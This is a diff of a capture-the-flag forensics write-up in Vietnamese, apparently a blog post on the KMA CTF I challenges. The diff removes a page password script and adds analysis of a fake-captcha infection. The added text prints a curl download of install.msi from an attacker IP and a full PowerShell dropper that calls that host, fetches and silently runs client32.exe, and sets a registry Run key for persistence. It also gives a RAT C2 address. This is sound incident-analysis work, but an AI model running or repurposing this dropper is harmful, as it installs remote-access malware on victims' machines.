@@ -89,32 +89,10 @@
   <header class="mb-4">
     <h1 class="f1 lh-condensed mb-2">KMA CTF I</h1><div class="d-flex flex-items-center color-fg-muted f5 mb-3"><time datetime="2026-05-24T00:00:00Z">
         2026-05-24
-      </time><span class="mx-2">&middot;</span><span>16 min read</span><span class="mx-2">&middot;</span><span>deroise2306</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/tags/forensics/" class="topic-tag">forensics</a><a href="/tags/kma/" class="topic-tag">KMA</a><a href="/tags/ctf/" class="topic-tag">CTF</a></div></header>
+      </time><span class="mx-2">&middot;</span><span>17 min read</span><span class="mx-2">&middot;</span><span>deroise2306</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/tags/forensics/" class="topic-tag">forensics</a><a href="/tags/kma/" class="topic-tag">KMA</a><a href="/tags/ctf/" class="topic-tag">CTF</a></div></header>
 
   <div class="markdown-body">
-    <script>
-async function checkPassword() {
-  const pwd = prompt("Nhập mật khẩu để xem bài viết:");
-  if (!pwd) {
-    document.body.innerHTML = "<h1>Please enter password</h1>";
-    return;
-  }
-  
-  const correctHash = "3583e2784d4accd7b12ddebc153b0dacb41db7e947a5736a58230a3f03935eb1";
-  
-  const encoder = new TextEncoder();
-  const data = encoder.encode(pwd);
-  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-  const inputHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-  
-  if (inputHash !== correctHash) {
-    document.body.innerHTML = "<h1>Wrong password</h1>";
-  }
-}
-window.addEventListener('load', checkPassword);
-</script>
-<h1 id="1-cctv">1. CCTV</h1>
+    <h1 id="1-cctv">1. CCTV</h1>
 <div style="text-align: center;">
 <p><img src="https://i.ibb.co/23kzH4kS/image.png" alt="CCTV" loading="lazy">
 </p>
@@ -626,7 +604,67 @@ Và khi Ctrl V thì ta sẽ có được command mà nó muốn mình chạy:</p
 <div class="highlight"><pre tabindex="0" class="chroma"><code data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">deroise2306</span>\<span class="n">Downloads</span><span class="o">&gt;</span><span class="n">curl</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">A</span> <span class="s2">&#34;missav&#34;</span> <span class="o">-</span><span class="n">o</span> <span class="n">install</span><span class="o">.</span><span class="n">msi</span> <span class="s2">&#34;http://138.2.62.171:443/install.msi&#34;</span>
 </span></span><span class="line"><span class="cl">  <span class="o">%</span> <span class="n">Total</span>    <span class="o">%</span> <span class="n">Received</span> <span class="o">%</span> <span class="n">Xferd</span>  <span class="n">Average</span> <span class="n">Speed</span>  <span class="n">Time</span>    <span class="n">Time</span>    <span class="n">Time</span>   <span class="n">Current</span>
 </span></span><span class="line"><span class="cl">                                 <span class="n">Dload</span>  <span class="n">Upload</span>  <span class="n">Total</span>   <span class="n">Spent</span>   <span class="n">Left</span>   <span class="n">Speed</span>
-</span></span><span class="line"><span class="cl"><span class="mi">100</span>  <span class="mf">2.25</span><span class="n">M</span> <span class="mi">100</span>  <span class="mf">2.25</span><span class="n">M</span>   <span class="mi">0</span>      <span class="mi">0</span>  <span class="mf">1.98</span><span class="n">M</span>      <span class="mi">0</span>   <span class="mi">00</span><span class="p">:</span><span class="mi">01</span>   <span class="mi">00</span><span class="p">:</span><span class="mi">01</span>          <span class="mf">1.32</span><span class="n">M</span></span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"><span class="mi">100</span>  <span class="mf">2.25</span><span class="n">M</span> <span class="mi">100</span>  <span class="mf">2.25</span><span class="n">M</span>   <span class="mi">0</span>      <span class="mi">0</span>  <span class="mf">1.98</span><span class="n">M</span>      <span class="mi">0</span>   <span class="mi">00</span><span class="p">:</span><span class="mi">01</span>   <span class="mi">00</span><span class="p">:</span><span class="mi">01</span>          <span class="mf">1.32</span><span class="n">M</span></span></span></code></pre></div><p>Vibe RE time ig:</p>
+<p><img src="https://i.ibb.co/x4pX4zX/097-FEF07-6299-42-D1-9-CCE-7-BA14593-C6-A3.png" alt="image" loading="lazy">
+
+Đáp án: <code>http://138.2.62.171:443/captcha.php</code></p>
+<h3 id="11-what-is-the-mitre-attck-technique-id-for-the-persistence-method-used-by">11. What is the MITRE ATT&amp;CK technique ID for the persistence method used by?</h3>
+<p>File php được nhắc đến ở trên:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">ided12</span> <span class="o">=</span> <span class="s2">&#34;ca90d68db06b4&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">null</span> <span class="o">=</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">Uri</span> <span class="s2">&#34;http://138.2.62.171:443/track.php?vid=$ided12&amp;action=started&#34;</span> <span class="o">-</span><span class="n">UseBasicParsing</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">{</span> <span class="o">$</span><span class="n">null</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">dir3961</span> <span class="o">=</span> <span class="s2">&#34;UPD-AD5F3D41-08C9-4BB4-A661-ABD8BA3603E3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">path07ae</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="ne">Path</span> <span class="s2">&#34;$env:APPDATA\$dir3961&#34;</span> <span class="o">-</span><span class="n">ItemType</span> <span class="ne">Directory</span> <span class="o">-</span><span class="n">Force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">zip2f8d</span> <span class="o">=</span> <span class="s2">&#34;$path07ae\software.zip&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">Uri</span> <span class="s2">&#34;http://138.2.62.171:443/downloads/AP-52163787-D405-4828-BBDD-09BB036BF5B3.zip&#34;</span> <span class="o">-</span><span class="n">OutFile</span> <span class="o">$</span><span class="n">zip2f8d</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">Stop</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">null</span> <span class="o">=</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">Uri</span> <span class="s2">&#34;http://138.2.62.171:443/track.php?vid=$ided12&amp;action=failed&#34;</span> <span class="o">-</span><span class="n">UseBasicParsing</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">FileSystem</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">Stop</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">IO</span><span class="o">.</span><span class="n">Compression</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="o">$</span><span class="n">zip2f8d</span><span class="p">,</span> <span class="o">$</span><span class="n">path07ae</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">null</span> <span class="o">=</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">Uri</span> <span class="s2">&#34;http://138.2.62.171:443/track.php?vid=$ided12&amp;action=failed&#34;</span> <span class="o">-</span><span class="n">UseBasicParsing</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Remove</span><span class="o">-</span><span class="n">Item</span> <span class="o">-</span><span class="ne">Path</span> <span class="o">$</span><span class="n">zip2f8d</span> <span class="o">-</span><span class="n">Force</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">exe7563</span> <span class="o">=</span> <span class="s2">&#34;$path07ae\client32.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Start</span><span class="o">-</span><span class="n">Process</span> <span class="o">-</span><span class="n">FilePath</span> <span class="o">$</span><span class="n">exe7563</span> <span class="o">-</span><span class="n">WindowStyle</span> <span class="n">Hidden</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">Test</span><span class="o">-</span><span class="ne">Path</span> <span class="o">$</span><span class="n">exe7563</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">reg2fdb</span> <span class="o">=</span> <span class="s1">&#39;HKCU:\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Set</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="ne">Path</span> <span class="o">$</span><span class="n">reg2fdb</span> <span class="o">-</span><span class="n">Name</span> <span class="s2">&#34;SystemUpdate_$ided12&#34;</span> <span class="o">-</span><span class="n">Value</span> <span class="s2">&#34;`&#34;</span><span class="o">$</span><span class="n">exe7563</span><span class="err">`</span><span class="s2">&#34;&#34;</span> <span class="o">-</span><span class="n">Type</span> <span class="ne">String</span> <span class="o">-</span><span class="n">Force</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">{</span> <span class="o">$</span><span class="n">null</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">null</span> <span class="o">=</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">WebRequest</span> <span class="o">-</span><span class="n">Uri</span> <span class="s2">&#34;http://138.2.62.171:443/track.php?vid=$ided12&amp;action=completed&#34;</span> <span class="o">-</span><span class="n">UseBasicParsing</span> <span class="o">-</span><span class="n">ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">catch</span> <span class="p">{</span> <span class="o">$</span><span class="n">null</span> <span class="p">}</span></span></span></code></pre></div><p>Tóm tắt thì file này thực hiện các bước: Tạo thư mục ẩn tên <code>UPD-AD5F3D41-08C9-4BB4-A661-ABD8BA3603E3</code> trong <code>%APPDATA%</code>, lưu file <code>software.zip</code> và giải nén + xoá file zip gốc, thực thi mã độc <code>client32.exe</code> trong file zip. Ghi vào Registry Key <code>HKCU:\Software\Microsoft\Windows\CurrentVersion\Run</code> để persistence.
+Và hành vi persistence bằng Registry Key như trên thì sau khi tra cứu ta có đáp án là <code>T1547.001</code></p>
+<p><img src="https://i.ibb.co/3m6pkyQ8/45100453-CAB2-4-DDF-95-A7-7-FC6-E1-B4-EF7-D.png" alt="image" loading="lazy">
+</p>
+<h3 id="12-cc-server-of-the-rat-example-9999">12. C&amp;C server of the RAT? (Example: 9.9.9.9)</h3>
+<p>Bước này thì ta cần phân tích file <code>client32.exe</code> một chút. Mở máy ảo, chạy file <code>install.sh</code> để xem cấu trúc malware:</p>
+<p><img src="https://i.ibb.co/kgfm5GVk/8538-EBCC-276-F-4-D3-C-8137-47510192-D59-C.png" alt="image" loading="lazy">
+</p>
+<p>Check file ini thì thấy được CnC Server:</p>
+<p><img src="https://i.ibb.co/GQjj6jRX/E46287-BA-D446-4-A27-9-D05-FCC30978-B4-E4.png" alt="image" loading="lazy">
+</p>
+<p>Đáp án sẽ là: <code>161.33.2.236</code></p>
+<p>Flag: <code>KMACTF{https://youtu.be/r9jL-lbE558_D5929CCFDEB6C5FF}</code></p>
+<p><img src="https://i.ibb.co/zWwKgLx9/FE8001-C3-F658-4-C2-D-907-E-A2485353083-D.png" alt="image" loading="lazy">
+</p>
+
   </div><div class="border-top pt-4 mt-4">
     <p class="f5 text-bold mb-2">Share</p>
     <div class="d-flex flex-wrap" style="gap: 0.5rem;">
